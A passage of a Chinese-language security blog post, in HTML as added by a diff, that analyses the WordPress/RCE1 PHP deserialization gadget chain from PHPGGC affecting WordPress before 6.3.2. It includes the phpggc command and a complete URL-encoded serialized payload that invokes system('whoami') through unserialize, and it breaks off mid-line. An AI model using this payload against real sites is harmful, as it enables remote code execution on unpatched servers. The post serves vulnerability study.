@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dililearngent.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.1","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":{"gitalk":{"order":-1}},"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="WordPress反序列化链分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一条有趣的WordPress反序列化链分析">
+<meta property="og:url" content="https://dililearngent.github.io/2024/02/07/WordPress-RCE1/index.html">
+<meta property="og:site_name" content="DiliLearngent&#39;s Blog">
+<meta property="og:description" content="WordPress反序列化链分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240206220058.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240206221343.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240206222129.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207000354.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207001449.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207002356.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207003829.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207114947.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207122634.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207123710.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207175419.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207214140.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240207235734.png">
+<meta property="article:published_time" content="2024-02-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-26T16:00:00.000Z">
+<meta property="article:author" content="DiliLearngent">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="PHP安全">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240206220058.png">
+
+
+<link rel="canonical" href="https://dililearngent.github.io/2024/02/07/WordPress-RCE1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://dililearngent.github.io/2024/02/07/WordPress-RCE1/","path":"2024/02/07/WordPress-RCE1/","title":"一条有趣的WordPress反序列化链分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>一条有趣的WordPress反序列化链分析 | DiliLearngent's Blog</title>
+  
+
+
+
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/injector/main.css" /><link rel="preload" as="style" href="/css/injector/light.css" /><link rel="preload" as="style" href="/css/injector/dark.css" />
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">DiliLearngent's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人要終於年輕時候的夢想！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-number">2.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%B1%BB"><span class="nav-number">3.</span> <span class="nav-text">相关类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Trick"><span class="nav-number">4.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-number">5.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-number">6.</span> <span class="nav-text">函数调用栈</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="nav-number">7.</span> <span class="nav-text">调试分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E7%BC%96%E5%86%99EXP"><span class="nav-number">8.</span> <span class="nav-text">尝试编写EXP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91"><span class="nav-number">9.</span> <span class="nav-text">触发</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">10.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="DiliLearngent"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">DiliLearngent</p>
+  <div class="site-description" itemprop="description">保持热爱!</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/DiliLearngent" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DiliLearngent" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+<div style="">
+  <canvas id="canvas" style="width:60%;">当前浏览器不支持canvas，请更换浏览器后再试</canvas>
+</div>
+<script>
+(function(){
+
+   var digit=
+    [
+        [
+            [0,0,1,1,1,0,0],
+            [0,1,1,0,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,0,1,1,0],
+            [0,0,1,1,1,0,0]
+        ],//0
+        [
+            [0,0,0,1,1,0,0],
+            [0,1,1,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [1,1,1,1,1,1,1]
+        ],//1
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,0,0,0],
+            [0,1,1,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,0,0,0,1,1],
+            [1,1,1,1,1,1,1]
+        ],//2
+        [
+            [1,1,1,1,1,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//3
+        [
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,1,0],
+            [0,0,1,1,1,1,0],
+            [0,1,1,0,1,1,0],
+            [1,1,0,0,1,1,0],
+            [1,1,1,1,1,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,1,1]
+        ],//4
+        [
+            [1,1,1,1,1,1,1],
+            [1,1,0,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,1,1,1,1,0],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//5
+        [
+            [0,0,0,0,1,1,0],
+            [0,0,1,1,0,0,0],
+            [0,1,1,0,0,0,0],
+            [1,1,0,0,0,0,0],
+            [1,1,0,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//6
+        [
+            [1,1,1,1,1,1,1],
+            [1,1,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,0,0,1,1,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0],
+            [0,0,1,1,0,0,0]
+        ],//7
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,1,1,0]
+        ],//8
+        [
+            [0,1,1,1,1,1,0],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [1,1,0,0,0,1,1],
+            [0,1,1,1,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,0,1,1],
+            [0,0,0,0,1,1,0],
+            [0,0,0,1,1,0,0],
+            [0,1,1,0,0,0,0]
+        ],//9
+        [
+            [0,0,0,0,0,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,0,0,0],
+            [0,0,0,0,0,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,1,1,1,0,0],
+            [0,0,0,0,0,0,0]
+        ]//:
+    ];
+
+var canvas = document.getElementById('canvas');
+
+if(canvas.getContext){
+    var cxt = canvas.getContext('2d');
+    //声明canvas的宽高
+    var H = 100,W = 700;
+    canvas.height = H;
+    canvas.width = W;
+    cxt.fillStyle = '#f00';
+    cxt.fillRect(10,10,50,50);
+
+    //存储时间数据
+    var data = [];
+    //存储运动的小球
+    var balls = [];
+    //设置粒子半径
+    var R = canvas.height/20-1;
+    (function(){
+        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
+        //存储时间数字，由十位小时、个位小时、冒号、十位分钟、个位分钟、冒号、十位秒钟、个位秒钟这7个数字组成
+        data.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
+    })();
+
+    /*生成点阵数字*/
+    function renderDigit(index,num){
+        for(var i = 0; i < digit[num].length; i++){
+            for(var j = 0; j < digit[num][i].length; j++){
+                if(digit[num][i][j] == 1){
+                    cxt.beginPath();
+                    cxt.arc(14*(R+2)*index + j*2*(R+1)+(R+1),i*2*(R+1)+(R+1),R,0,2*Math.PI);
+                    cxt.closePath();
+                    cxt.fill();
+                }
+            }
+        }
+    }
+
+    /*更新时钟*/
+    function updateDigitTime(){
+        var changeNumArray = [];
+        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
+        var NewData = [];
+        NewData.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
+        for(var i = data.length-1; i >=0 ; i--){
+            //时间发生变化
+            if(NewData[i] !== data[i]){
+                //将变化的数字值和在data数组中的索引存储在changeNumArray数组中
+                changeNumArray.push(i+'_'+(Number(data[i])+1)%10);
+            }
+        }
+        //增加小球
+        for(var i = 0; i< changeNumArray.length; i++){
+            addBalls.apply(this,changeNumArray[i].split('_'));
+        }
+        data = NewData.concat();
+    }
+
+    /*更新小球状态*/
+    function updateBalls(){
+        for(var i = 0; i < balls.length; i++){
+            balls[i].stepY += balls[i].disY;
+            balls[i].x += balls[i].stepX;
+            balls[i].y += balls[i].stepY;
+            if(balls[i].x > W + R || balls[i].y > H + R){
+                balls.splice(i,1);
+                i--;
+            }
+        }
+    }
+
+    /*增加要运动的小球*/
+    function addBalls(index,num){
+        var numArray = [1,2,3];
+        var colorArray =  ["#3BE","#09C","#A6C","#93C","#9C0","#690","#FB3","#F80","#F44","#C00"];
+        for(var i = 0; i < digit[num].length; i++){
+            for(var j = 0; j < digit[num][i].length; j++){
+                if(digit[num][i][j] == 1){
+                    var ball = {
+                        x:14*(R+2)*index + j*2*(R+1)+(R+1),
+                        y:i*2*(R+1)+(R+1),
+                        stepX:Math.floor(Math.random() * 4 -2),
+                        stepY:-2*numArray[Math.floor(Math.random()*numArray.length)],
+                        color:colorArray[Math.floor(Math.random()*colorArray.length)],
+                        disY:1
+                    };
+                    balls.push(ball);
+                }
+            }
+        }
+    }
+
+    /*渲染*/
+    function render(){
+        //重置画布宽度，达到清空画布的效果
+        canvas.height = 100;
+        //渲染时钟
+        for(var i = 0; i < data.length; i++){
+            renderDigit(i,data[i]);
+        }
+        //渲染小球
+        for(var i = 0; i < balls.length; i++){
+            cxt.beginPath();
+            cxt.arc(balls[i].x,balls[i].y,R,0,2*Math.PI);
+            cxt.fillStyle = balls[i].color;
+            cxt.closePath();
+            cxt.fill();
+        }
+    }
+
+    clearInterval(oTimer);
+    var oTimer = setInterval(function(){
+        //更新时钟
+        updateDigitTime();
+        //更新小球状态
+        updateBalls();
+        //渲染
+        render();
+    },50);
+}
+
+})();
+</script>
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://dililearngent.github.io/2024/02/07/WordPress-RCE1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="DiliLearngent">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DiliLearngent's Blog">
+      <meta itemprop="description" content="保持热爱!">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="一条有趣的WordPress反序列化链分析 | DiliLearngent's Blog">
+      <meta itemprop="description" content="WordPress反序列化链分析">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          一条有趣的WordPress反序列化链分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-02-08 00:00:00" itemprop="dateCreated datePublished" datetime="2024-02-08T00:00:00+08:00">2024-02-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-03-27 00:00:00" itemprop="dateModified" datetime="2024-03-27T00:00:00+08:00">2024-03-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/PHP%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">PHP安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>3.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>13 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">WordPress反序列化链分析</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近实践中正好碰到一个WordPress站点，发现很久没有关注PHP框架中的漏洞，于是去PHPGGC上看一看有没有”好玩的”RCE，正好看到WordPress&#x2F;RCE&#x2F;1这条链，仔细分析一下其过程</p>
+<h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p>WordPress &lt; 6.3.2，存在一条反序列链，以WP_Theme中的__toString为起点，WpOrg\Requests\Hooks的dispatch方法为终点。</p>
+<h1 id="相关类"><a href="#相关类" class="headerlink" title="相关类"></a>相关类</h1><p><strong>WP_Block_List类</strong>：</p>
+<p>在WordPress中，<code>WP_Block_List</code> 类是用于管理和操作页面上的块（blocks）的核心类之一。块是WordPress编辑器（Gutenberg）的基本构建单元，用于创建和组织内容。</p>
+<p><code>WP_Block_List</code> 类提供了一系列方法来处理块，包括以下功能：</p>
+<ol>
+<li>注册和管理块类型：<code>WP_Block_List</code> 类允许开发者注册和管理自定义的块类型。通过注册块类型，可以定义块的属性、编辑器样式和渲染模板等。</li>
+<li>渲染块内容：<code>WP_Block_List</code> 类提供了方法来渲染块的内容。这包括将块的属性传递给块模板，生成最终的块输出。</li>
+<li>解析块内容：<code>WP_Block_List</code> 类还提供了将块内容解析为可编辑的块数据结构的方法。这对于处理保存在数据库中的块内容以及在编辑器中加载和编辑块非常有用。</li>
+<li>块过滤和转换：<code>WP_Block_List</code> 类提供了方法来过滤和转换块内容。这样可以对块进行操作，例如添加、删除、修改属性或在块之间进行排序。</li>
+</ol>
+<p><strong>WP_Theme</strong>：</p>
+<p>在WordPress中，WP_Theme类是一个用于处理和管理主题（theme）的类。它提供了一组方法和属性，用于获取主题的信息、样式和模板文件、父子主题关系等。</p>
+<p><strong>WP_Block_Type_Registry</strong>：</p>
+<p>WP_Block_Type_Registry类是一个用于管理和注册区块类型（Block Type）的类。它提供了一系列方法和功能，用于注册、检索和操作区块类型。开发者可以轻松地注册、获取和管理区块类型。区块类型是Gutenberg编辑器中的核心概念，它定义了一个可重复使用的区块，具有自己的属性、样式和呈现逻辑。WP_Block_Type_Registry类提供了一种机制，允许开发者通过自定义区块类型来扩展和定制WordPress的编辑体验。</p>
+<p><strong>WpOrg\Requests\Session</strong>：</p>
+<p>WpOrg\Requests\Session是一个用于处理会话数据的类。它提供了一组方法和功能，用于在WordPress应用程序中管理和存储会话数据。</p>
+<p><strong>WpOrg\Requests\Hooks</strong>：</p>
+<p>Wp_Hook类的方法允许开发者通过添加、移除和执行回调函数来自定义和扩展WordPress功能。通过使用动作钩子和过滤器钩子，开发者可以在适当的时机干预WordPress的执行流程，并修改数据、添加功能或者改变输出。</p>
+<h1 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">hello</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$hello</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hello</span>();</span><br><span class="line">	[<span class="variable">$hello</span>,<span class="string">&quot;aaa&quot;</span>]();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样能够成功执行hello中的aaa方法，这在CTF中经常出现</p>
+<p><strong>可变函数</strong>：可变函数（Variable Functions）是一种特殊的语法，允许通过变量来调用函数。这意味着函数名可以存储在一个变量中，并在需要时通过该变量动态调用函数。</p>
+<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p><strong>payload生成</strong>：</p>
+<p>使用phpggc生成：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php phpggc WordPress/RCE1 system whoami -u</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20240206220058.png"></p>
+<p><strong>测试文件</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/wp-load.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">wp</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;O%3A8%3A%22WP_Theme%22%3A2%3A%7Bs%3A7%3A%22headers%22%3BO%3A13%3A%22WP_Block_List%22%3A2%3A%7Bs%3A6%3A%22blocks%22%3Ba%3A1%3A%7Bs%3A4%3A%22Name%22%3Ba%3A1%3A%7Bs%3A9%3A%22blockName%22%3Bs%3A12%3A%22Parent+Theme%22%3B%7D%7Ds%3A8%3A%22registry%22%3BO%3A22%3A%22WP_Block_Type_Registry%22%3A1%3A%7Bs%3A22%3A%22registered_block_types%22%3BO%3A8%3A%22WP_Theme%22%3A2%3A%7Bs%3A7%3A%22headers%22%3BN%3Bs%3A6%3A%22parent%22%3BO%3A22%3A%22WpOrg%5CRequests%5CSession%22%3A3%3A%7Bs%3A3%3A%22url%22%3Bs%3A10%3A%22http%3A%2F%2Fp%3A0%22%3Bs%3A7%3A%22headers%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A7%3A%22options%22%3Ba%3A1%3A%7Bs%3A5%3A%22hooks%22%3BO%3A20%3A%22WpOrg%5CRequests%5CHooks%22%3A1%3A%7Bs%3A5%3A%22hooks%22%3Ba%3A1%3A%7Bs%3A23%3A%22requests.before_request%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A20%3A%22WpOrg%5CRequests%5CHooks%22%3A1%3A%7Bs%3A5%3A%22hooks%22%3Ba%3A1%3A%7Bs%3A15%3A%22http%3A%2F%2Fp%3A0%2FName%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3B%7D%7D%7D%7Di%3A1%3Bs%3A8%3A%22dispatch%22%3B%7D%7D%7D%7D%7D%7D%7D%7D%7D%7Ds%3A6%3A%22parent%22%3BN%3B%7D&quot;</span>;</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ 